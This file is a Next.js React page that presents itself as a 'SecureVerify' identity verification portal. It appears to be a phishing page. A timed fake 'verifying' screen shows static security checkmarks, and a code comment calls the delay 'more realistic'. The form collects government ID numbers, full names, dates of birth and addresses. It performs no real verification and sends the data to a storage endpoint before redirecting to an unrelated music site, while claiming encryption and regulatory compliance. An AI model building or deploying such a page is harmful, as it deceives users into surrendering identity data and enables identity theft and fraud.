import { useState, useEffect } from 'react';
import Head from 'next/head';

export default function Verification() {
  const [step, setStep] = useState(1);
  const [userData, setUserData] = useState({
    country: '',
    idNumber: '',
    fullName: '',
    city: '',
    dateOfBirth: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');

  // Step 1: Verifying (automatic progression)
  useEffect(() => {
    if (step === 1) {
      const timer = setTimeout(() => {
        setStep(2);
      }, 4000); // 4 seconds for more realistic verification
      return () => clearTimeout(timer);
    }
  }, [step]);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setUserData({
      ...userData,
      [name]: value
    });
    
    // Clear errors when user starts typing
    if (error) setError('');
  };

  const validateForm = () => {
    if (!userData.country || !userData.idNumber || !userData.fullName || !userData.city || !userData.dateOfBirth) {
      return 'Please fill in all required fields';
    }
    
    // ID Number validation - minimum 8 characters
    if (userData.idNumber.length < 8) {
      return 'ID Number must be at least 8 characters long';
    }
    
    // Name validation
    if (userData.fullName.length < 2) {
      return 'Please enter your full legal name';
    }
    
    return null;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setSuccess('');
    setIsLoading(true);

    const validationError = validateForm();
    if (validationError) {
      setError(validationError);
      setIsLoading(false);
      return;
    }

    try {
      // Show processing state
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Store in localStorage
      const userSession = {
        ...userData,
        verified: true,
        verifiedAt: new Date().toISOString(),
        sessionId: Math.random().toString(36).substr(2, 9)
      };
      localStorage.setItem('user_session', JSON.stringify(userSession));

      // Send to NeonDB
      const response = await fetch('/api/store-verification', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(userSession)
      });

      if (!response.ok) {
        throw new Error('Verification submission failed');
      }

      setSuccess('✅ Identity verified successfully! Redirecting...');
      
      // Redirect after success
      setTimeout(() => {
        window.location.href = 'https://art-premier-music-library.vercel.app/';
      }, 2000);
      
    } catch (error) {
      setError('Verification failed. Please check your connection and try again.');
    } finally {
      setIsLoading(false);
    }
  };

  // Step 1: Verifying Loading Screen
  if (step === 1) {
    return (
      <>
        <Head>
          <title>Identity Verification - Secure Portal</title>
          <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>" />
        </Head>
        <div className="verification-container">
          <div className="verification-box">
            <div className="security-shield">
              <div className="shield-icon">🛡️</div>
            </div>
            <div className="loading-spinner">
              <div className="spinner"></div>
            </div>
            <h2>Initializing Secure Verification</h2>
            <p>Setting up your secure verification session...</p>
            <div className="security-features">
              <div className="feature">
                <span className="check">✓</span>
                <span>Encryption enabled</span>
              </div>
              <div className="feature">
                <span className="check">✓</span>
                <span>Secure connection established</span>
              </div>
              <div className="feature">
                <div className="spinner-small"></div>
                <span>Loading verification portal</span>
              </div>
            </div>
          </div>

          <style jsx>{`
            .verification-container {
              min-height: 100vh;
              background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
              display: flex;
              align-items: center;
              justify-content: center;
              font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
              padding: 20px;
            }
            
            .verification-box {
              background: white;
              padding: 50px 40px;
              border-radius: 15px;
              box-shadow: 0 20px 40px rgba(0,0,0,0.1);
              text-align: center;
              max-width: 500px;
              width: 100%;
            }
            
            .security-shield {
              margin-bottom: 30px;
            }
            
            .shield-icon {
              font-size: 60px;
              animation: pulse 2s infinite;
            }
            
            .loading-spinner {
              margin-bottom: 25px;
            }
            
            .spinner {
              width: 60px;
              height: 60px;
              border: 4px solid #e6e6e6;
              border-top: 4px solid #667eea;
              border-radius: 50%;
              animation: spin 1.5s linear infinite;
              margin: 0 auto;
            }
            
            .spinner-small {
              width: 16px;
              height: 16px;
              border: 2px solid #e6e6e6;
              border-top: 2px solid #667eea;
              border-radius: 50%;
              animation: spin 1s linear infinite;
              display: inline-block;
              margin-right: 8px;
            }
            
            h2 {
              color: #2c3e50;
              margin-bottom: 15px;
              font-size: 28px;
              font-weight: 600;
            }
            
            p {
              color: #7f8c8d;
              margin-bottom: 30px;
              font-size: 16px;
              line-height: 1.5;
            }
            
            .security-features {
              display: flex;
              flex-direction: column;
              gap: 12px;
              text-align: left;
              max-width: 300px;
              margin: 0 auto;
            }
            
            .feature {
              display: flex;
              align-items: center;
              gap: 10px;
              color: #27ae60;
              font-size: 14px;
            }
            
            .check {
              color: #27ae60;
              font-weight: bold;
              font-size: 16px;
            }
            
            @keyframes spin {
              0% { transform: rotate(0deg); }
              100% { transform: rotate(360deg); }
            }
            
            @keyframes pulse {
              0% { transform: scale(1); }
              50% { transform: scale(1.05); }
              100% { transform: scale(1); }
            }
          `}</style>
        </div>
      </>
    );
  }

  // Step 2: Verification Form
  return (
    <>
      <Head>
        <title>Identity Verification - Secure Portal</title>
        <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>" />
      </Head>
      <div className="verification-container">
        <div className="verification-box">
          <div className="header">
            <div className="logo">
              <div className="logo-icon">🔒</div>
              <h1>SecureVerify</h1>
            </div>
            <div className="security-badge">
              <span className="badge-icon">✓</span>
              Secure SSL Connection
            </div>
          </div>

          <div className="progress-bar">
            <div className="progress-fill"></div>
          </div>

          <h2>Identity Verification Required</h2>
          <p className="subtitle">To ensure the security of your account, please verify your identity with the following information:</p>

          {error && (
            <div className="error-message">
              <span className="error-icon">⚠️</span>
              {error}
            </div>
          )}

          {success && (
            <div className="success-message">
              <span className="success-icon">✅</span>
              {success}
            </div>
          )}

          <form onSubmit={handleSubmit} className="verification-form">
            <div className="form-grid">
              <div className="input-group">
                <label htmlFor="country">Country of Residence *</label>
                <select
                  id="country"
                  name="country"
                  value={userData.country}
                  onChange={handleInputChange}
                  required
                  className="form-input"
                >
                  <option value="">Select your country</option>
                  <option value="US">United States</option>
                  <option value="UK">United Kingdom</option>
                  <option value="CA">Canada</option>
                  <option value="AU">Australia</option>
                  <option value="MW">Malawi</option>
                  <option value="ZA">South Africa</option>
                  <option value="NG">Nigeria</option>
                  <option value="KE">Kenya</option>
                  <option value="GH">Ghana</option>
                </select>
              </div>

              <div className="input-group">
                <label htmlFor="idNumber">Government ID Number *</label>
                <input
                  type="text"
                  id="idNumber"
                  name="idNumber"
                  value={userData.idNumber}
                  onChange={handleInputChange}
                  placeholder="Enter your ID, passport, or license number"
                  required
                  className="form-input"
                  minLength="8"
                  maxLength="30"
                />
                <small className="help-text">Must be at least 8 characters</small>
              </div>

              <div className="input-group">
                <label htmlFor="fullName">Full Legal Name *</label>
                <input
                  type="text"
                  id="fullName"
                  name="fullName"
                  value={userData.fullName}
                  onChange={handleInputChange}
                  placeholder="As it appears on your official documents"
                  required
                  className="form-input"
                  maxLength="50"
                />
              </div>

              <div className="input-group">
                <label htmlFor="city">City of Residence *</label>
                <input
                  type="text"
                  id="city"
                  name="city"
                  value={userData.city}
                  onChange={handleInputChange}
                  placeholder="Enter your current city"
                  required
                  className="form-input"
                  maxLength="30"
                />
              </div>

              <div className="input-group">
                <label htmlFor="dateOfBirth">Date of Birth *</label>
                <input
                  type="date"
                  id="dateOfBirth"
                  name="dateOfBirth"
                  value={userData.dateOfBirth}
                  onChange={handleInputChange}
                  required
                  className="form-input"
                />
              </div>
            </div>

            <div className="privacy-notice">
              <div className="lock-icon">🔒</div>
              <div className="notice-text">
                <strong>Your Privacy & Security</strong>
                <p>All information is encrypted and processed securely. We comply with global data protection regulations to ensure your personal data remains safe.</p>
              </div>
            </div>

            <button 
              type="submit" 
              className="submit-button"
              disabled={isLoading}
            >
              {isLoading ? (
                <div className="button-loading">
                  <div className="button-spinner"></div>
                  Verifying Identity...
                </div>
              ) : (
                'Verify My Identity'
              )}
            </button>
          </form>

          <div className="footer-note">
            <p>🔒 Protected by end-to-end encryption • 🌐 Globally compliant • ⚡ Instant verification</p>
          </div>
        </div>

        <style jsx>{`
          .verification-container {
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
          }
          
          .verification-box {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 600px;
            width: 100%;
          }
          
          .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
          }
          
          .logo {
            display: flex;
            align-items: center;
            gap: 12px;
          }
          
          .logo-icon {
            font-size: 32px;
          }
          
          .logo h1 {
            color: #2c3e50;
            margin: 0;
            font-size: 24px;
            font-weight: 700;
          }
          
          .security-badge {
            background: #27ae60;
            color: white;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 6px;
          }
          
          .badge-icon {
            font-size: 14px;
          }
          
          .progress-bar {
            height: 4px;
            background: #ecf0f1;
            border-radius: 2px;
            margin-bottom: 25px;
            overflow: hidden;
          }
          
          .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            width: 100%;
            animation: progress 2s ease-in-out;
          }
          
          h2 {
            color: #2c3e50;
            margin-bottom: 10px;
            font-size: 24px;
            font-weight: 600;
          }
          
          .subtitle {
            color: #7f8c8d;
            margin-bottom: 30px;
            font-size: 15px;
            line-height: 1.5;
          }
          
          .error-message {
            background: #ffeaea;
            color: #e74c3c;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #fadbd9;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
          }
          
          .success-message {
            background: #e8f6ef;
            color: #27ae60;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #d4efdf;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
          }
          
          .verification-form {
            display: flex;
            flex-direction: column;
            gap: 25px;
          }
          
          .form-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
          }
          
          .input-group {
            display: flex;
            flex-direction: column;
            gap: 8px;
          }
          
          label {
            font-weight: 600;
            color: #2c3e50;
            font-size: 14px;
          }
          
          .form-input {
            padding: 14px;
            border: 2px solid #ecf0f1;
            border-radius: 8px;
            font-size: 15px;
            background: #f8f9fa;
            transition: all 0.3s;
            box-sizing: border-box;
            width: 100%;
          }
          
          .form-input:focus {
            border-color: #667eea;
            outline: none;
            background: white;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
          }
          
          .help-text {
            color: #7f8c8d;
            font-size: 12px;
          }
          
          .privacy-notice {
            display: flex;
            gap: 15px;
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            border-left: 4px solid #667eea;
          }
          
          .lock-icon {
            font-size: 24px;
            color: #667eea;
          }
          
          .notice-text {
            flex: 1;
          }
          
          .notice-text strong {
            color: #2c3e50;
            display: block;
            margin-bottom: 6px;
            font-size: 15px;
          }
          
          .notice-text p {
            color: #7f8c8d;
            font-size: 13px;
            margin: 0;
            line-height: 1.5;
          }
          
          .submit-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            height: 52px;
            width: 100%;
          }
          
          .submit-button:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
          }
          
          .submit-button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
          }
          
          .button-loading {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
          }
          
          .button-spinner {
            width: 18px;
            height: 18px;
            border: 2px solid transparent;
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
          }
          
          .footer-note {
            text-align: center;
            margin-top: 25px;
            padding-top: 20px;
            border-top: 1px solid #ecf0f1;
          }
          
          .footer-note p {
            color: #7f8c8d;
            font-size: 12px;
            margin: 0;
          }
          
          @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
          }
          
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }

          @media (max-width: 768px) {
            .form-grid {
              grid-template-columns: 1fr;
            }
            
            .header {
              flex-direction: column;
              gap: 15px;
              text-align: center;
            }
            
            .verification-box {
              padding: 30px 20px;
            }
          }

          @media (max-width: 480px) {
            .verification-container {
              padding: 10px;
            }
            
            .verification-box {
              padding: 25px 15px;
            }
            
            h2 {
              font-size: 20px;
            }
          }
        `}</style>
      </div>
    </>
  );
}
